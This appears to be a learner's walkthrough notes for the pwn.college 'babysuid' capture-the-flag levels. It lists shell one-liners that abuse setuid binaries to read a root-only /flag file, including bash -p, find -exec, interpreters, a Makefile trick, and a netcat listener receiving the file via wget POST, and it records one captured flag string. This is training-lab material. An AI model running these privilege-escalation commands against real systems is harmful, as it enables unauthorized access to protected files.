# Level 1/2/3/4/5/6/7/8/9 - SUID

```
> cd /challenge
> ls -al <name>
> ./babysuid_level1
> ./usr/bin/cat /flag
```

flag: `pwn.college{wnlOfJ8zdOdgVoWRP1zVwfkSYw1.QXzQTMsMTOwEzW}`

- https://www.gtk.org/setuid.html

# Level 10/11/12/13/14/15/17/18/19/20/22 - 

```
> ./rev /flag | rev
> od -An -c /flag | sed 's/ //g'
> hd /flag
> xxd /flag
> base32 /flag | base32 -d
> base64 /flag | base64 -d
> gzip flag | zcat flag.gz
> bzip2 -dc flag.bz2 
> zip /flag.zip /flag | unzip -p /flag.zip | more
> tar -czvf flag.tar.gz flag | tar - xzf flag.tar.gz -O
> echo /flag | cpio -o
> genisoimage -sort /flag /flag

```

# Level 24/25/27/28/29/30/31-48 - Using programs with SUID to execute other programs

- moving cat to mv
- Try to print flag by executing a command with error to print

```
> env cat flag
> find /flag -exec cat flag {} \;
> nice cat /flag
> timeout 100 cat /flag
> stdbuf -oL cat /flag

> setarch --list
> setarch uname26 cat /flag

> watch -x cat /flag
> socat file:/flag stdout
> whiptail --textbox /flag 10 100
> awk '{print}' /flag
> sed 's/<TEXT_TO_FINX>/<TEXT_TO_REPLACE_WITH>/' /flag
> sed 's/ajsipgh//' /flag
> ed /flag; p
> chown hacker /flag; cat /flag
> chmod +r /flag; cat /flag
> cat /flag /dev/stdout
> mv /usr/bin/cat /usr/bin/mv && /challenge/baby* && mv /flag
> perl -ne print /flag 2>/dev/null
> python; x=open('flag', 'r').read(); print(x)
> echo 'puts File.read("/flag")' > /tmp/script.rb && ruby /tmp/script.rb
> bash -p -c 'cat /flag' // execute command (-c) in priviledge mode (-p)
> date -f /flag
> dmesg -F /flag
> wc --files0-from /flag
> gcc -x c -E /flag // compile header of C file only
> as -x /flag
> wget -i /flag // not good because all in lower case
> nc -lvvnp 1234 & wget 127.0.0.1:1234 --method=POST --body-file=/flag // posting to server to pring
```

# Level 26 - SUID with makefile

```
1. create makefile in directory which we have write access
run:
    cat /flag

2. execute makefile
> make run
```

# Level 51 - 


